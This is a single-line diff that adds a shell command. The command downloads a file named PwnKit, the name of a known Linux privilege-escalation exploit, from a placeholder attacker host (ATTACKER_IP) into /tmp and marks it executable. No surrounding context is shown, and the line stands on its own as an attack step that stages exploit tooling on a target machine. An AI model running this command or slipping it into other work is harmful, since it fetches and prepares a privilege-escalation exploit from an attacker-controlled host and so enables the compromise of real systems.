@@ -1,0 +1,1 @@
+curl -o /tmp/PwnKit http://ATTACKER_IP/tools/PwnKit && chmod +x /tmp/PwnKit
